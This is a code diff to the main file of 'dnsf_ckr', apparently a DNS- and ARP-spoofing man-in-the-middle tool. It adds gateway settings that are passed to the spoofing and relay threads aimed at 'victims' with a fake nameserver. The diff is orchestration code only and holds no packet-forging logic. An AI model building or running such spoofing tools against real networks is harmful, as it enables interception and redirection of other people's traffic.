@@ -36,6 +36,7 @@ static void start_nbots(const dnsf_ckr_victims_ctx *victims,
                         const dnsf_ckr_hostnames_set_ctx *hostnames,
                         const dnsf_ckr_realdnstransactions_ctx *transactions,
                         const dnsf_ckr_fakenameserver_ctx *fakenameserver,
+                        const dnsf_ckr_gateways_config_ctx *gateways,
                         const char *iface, const int arpspf_pkt_nr,
                         const int dnsspf_ttl, const int reqhandlers_nr);
 
@@ -65,6 +66,7 @@ static void start_nbots(const dnsf_ckr_victims_ctx *victims,
                         const dnsf_ckr_hostnames_set_ctx *hostnames,
                         const dnsf_ckr_realdnstransactions_ctx *transactions,
                         const dnsf_ckr_fakenameserver_ctx *fakenameserver,
+                        const dnsf_ckr_gateways_config_ctx *gateways,
                         const char *iface, const int arpspf_pkt_nr,
                         const int dnsspf_ttl, const int reqhandlers_nr) {
     struct dnsf_ckr_bot_routine_ctx spf_args, rly_args;
@@ -77,8 +79,10 @@ static void start_nbots(const dnsf_ckr_victims_ctx *victims,
     //  the relay thread routine arguments...
     rly_args.arg[0] = (void *)transactions;
     rly_args.arg[1] = (void *)fakenameserver;
-    rly_args.arg[2] = (void *)&dnsspf_ttl;
-    rly_args.arg[3] = (void *)&reqhandlers_nr;
+    rly_args.arg[2] = (void *)gateways;
+    rly_args.arg[3] = (void *)&dnsspf_ttl;
+    rly_args.arg[4] = (void *)&reqhandlers_nr;
+    rly_args.arg[5] = (void *)iface;
 
     pthread_attr_init(&spf_thread_attr);
     pthread_create(&spf_thread, &spf_thread_attr, dnsf_ckr_arp_spoofing_bot_routine, &spf_args);
@@ -98,6 +102,7 @@ int main(int argc, char **argv) {
     dnsf_ckr_servers_ctx *servers = NULL;
     dnsf_ckr_hostnames_set_ctx *hostnames = NULL;
     dnsf_ckr_fakenameserver_ctx *fakenameserver = NULL;
+    dnsf_ckr_gateways_config_ctx *gateways = NULL;
     char iface[0xff];
     int exit_code = 0;
     int arpspf_pkt_nr = 0;
@@ -193,6 +198,11 @@ int main(int argc, char **argv) {
         return 1;
     }
 
+    gateways = dnsf_ckr_get_gatewaysconfig_config(fp, victims, servers);
+    if (gateways == NULL) {
+        printf("dnsf_ckr WARNING: no valid gateway-config were found, so you can really f_ck them up, you're bad... lazilly bad.\n");
+    }
+
     arpspf_pkt_nr = dnsf_ckr_get_core_int_config(fp, "arpspf-pkt-nr", 3);
 
     dnsspf_ttl = dnsf_ckr_get_core_int_config(fp, "dnsspf-ttl", 240);
@@ -206,13 +216,13 @@ int main(int argc, char **argv) {
 
     printf("dnsf_ckr INFO: Initializing...\n");
 
-    if ((exit_code = (dnsf_ckr_get_mac_of_victims_and_servers(&victims, &servers, iface) == 0))) {
+    if ((exit_code = (dnsf_ckr_get_mac_of_victims_and_servers(&victims, &servers, &gateways, iface) == 0))) {
         printf("dnsf_ckr UPSET STATUS: bye! :(\n");
     } else {
         fclose(fp);
         fp = NULL;
         dnsf_ckr_init_sockio(iface);
-        start_nbots(victims, servers, hostnames, transactions, fakenameserver, iface, arpspf_pkt_nr, dnsspf_ttl, reqhandlers_nr);
+        start_nbots(victims, servers, hostnames, transactions, fakenameserver, gateways, iface, arpspf_pkt_nr, dnsspf_ttl, reqhandlers_nr);
         dnsf_ckr_fini_sockio();
     }
     del_dnsf_ckr_victims_ctx(victims);
@@ -220,6 +230,7 @@ int main(int argc, char **argv) {
     del_dnsf_ckr_hostnames_set_ctx(hostnames);
     del_dnsf_ckr_realdnstransactions_ctx(transactions);
     del_dnsf_ckr_fakenameserver_ctx(fakenameserver);
+    del_dnsf_ckr_gateways_config_ctx(gateways);
     if (fp != NULL) {
         fclose(fp);
     }
